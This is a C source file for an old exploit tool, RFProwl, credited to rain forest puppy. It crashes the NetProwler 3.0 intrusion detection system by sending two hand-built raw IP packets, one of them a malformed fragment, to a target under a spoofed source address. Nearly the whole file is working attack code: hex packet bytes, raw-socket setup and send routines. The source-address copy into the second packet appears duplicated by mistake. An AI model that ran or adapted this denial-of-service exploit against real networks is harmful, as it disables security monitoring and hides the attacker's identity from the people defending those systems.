/* 	RFProwl.c - rain forest puppy / wiretrip / rfp@wiretrip.net
	
	Kills NetProwler IDS version 3.0
	
	You need libnet installed.  It's available from
	www.packetfactory.net.  Acks to route.

	Only tested on RH 6.x Linux.  To compile:
	gcc RFProwl.c -lnet -o RFProwl			

	Plus, make sure your architecture is defined below:   */

#define LIBNET_LIL_ENDIAN 1
#undef  LIBNET_BIG_ENDIAN 1

#include <libnet.h>

/* it's just much easier to code in the packet frags we want. :) */

char pack1[]="\x45\x00"
"\x00\x24\x08\xb9\x00\x03\x3e\x06\x96\xf8\x0a\x09\x65\x0d\x0a\x09"
"\x64\x01\x04\x02\x08\x0a\x00\x26\xcd\x35\x00\x00\x00\x00\x01\x02"
"\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";

char pack2[]="\x45\x00"
"\x00\x2c\x08\xbf\x20\x00\x3e\x06\x76\xed\x0a\x09\x65\x0d\x0a\x09"
"\x64\x01\x04\x08\x00\x15\xa7\xe4\x00\x48\x00\x00\x00\x00\xa0\x02"
"\x7d\x78\x72\x9d\x00\x00\x02\x04\x05\xb4\x00\x00";

int main(int argc, char **argv) {
    int sock, c;
    u_long src_ip, dst_ip;

    printf("RFProwl - rain forest puppy / wiretrip\n");

    if(argc<3){
      printf("Usage: RFProwl <profiled IP/destination> <src IP(fake)>\n");
      exit(EXIT_FAILURE);}

    dst_ip=inet_addr(argv[1]);
    src_ip=inet_addr(argv[2]);

    memcpy(pack1+16,&dst_ip,4);
    memcpy(pack2+16,&dst_ip,4);
    memcpy(pack1+12,&src_ip,4);
    memcpy(pack1+12,&src_ip,4);

    sock = open_raw_sock(IPPROTO_RAW);
    if (sock == -1){
      perror("Socket problems: ");
      exit(EXIT_FAILURE);}
    
    c = write_ip(sock, pack1, 46);
    if (c < 46) printf("Write_ip #1 choked\n");

    c = write_ip(sock, pack2, 46);
    if (c < 46) printf("Write_ip #2 choked\n");
  
    printf("Packets sent\n");

    return (c == -1 ? EXIT_FAILURE : EXIT_SUCCESS);}
